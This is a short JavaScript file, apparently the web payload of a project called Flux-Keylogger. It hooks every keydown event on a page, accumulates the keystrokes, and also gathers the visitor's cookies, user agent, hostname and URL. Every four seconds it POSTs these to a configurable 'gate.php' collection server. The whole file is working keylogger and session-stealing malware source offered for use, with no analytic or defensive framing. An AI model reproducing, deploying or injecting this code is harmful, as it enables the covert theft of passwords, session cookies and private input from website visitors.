// https://github.com/LimerBoy/Flux-Keylogger/

// Settings
var fluxGate = "http://localhost:80/gate.php";
var sendTimeout = 4000;


// KEYLOGGER
var keys = "";
document.addEventListener("keydown", function(e) {
	keyCode = e.keyCode;
	keyName = e.key;
	console.log(keyCode);
	// Check key
	switch(keyCode) {
		// ENTER
		case 13:
			keyName = "\n";
			break;
		// BACKSPACE
		case 8:
			keyName = "";
			keys = keys.slice(0, -1);
			break;
		// NORMAL KEY
		default:
			// If is special key add < KEY >
			if (keyName.length > 1) {
				keyName = " <" + keyName + "> ";
			}
			break;
	}
	// Add	
	keys += keyName;
});

// Save keylogs, useragents, ip, location, host, cookies.
date = new Date;
var old = 0;
function saveAll() {

	// Check for new data
	if (old == keys.length) {
		//console.log("not sending..")
		return "";
	} else {
		old = keys.length;
		//console.log("sending..")
	}

	var time     = date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds();
	var uagents  = window.navigator.userAgent;
	var host     = window.location.hostname;
	var location = document.location;
	var cookies  = document.cookie;

	var http     = new XMLHttpRequest();
	var params   = "keyLogs=" + keys + "&cookies=" + cookies + "&uagents=" + uagents + "&location=" + location + "&host=" + host + "&time=" + time + "&sendLogs";
	http.open("POST", fluxGate, true);

	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	http.send(params);

}

// Create loop
setInterval(function() {
  saveAll();
}, sendTimeout);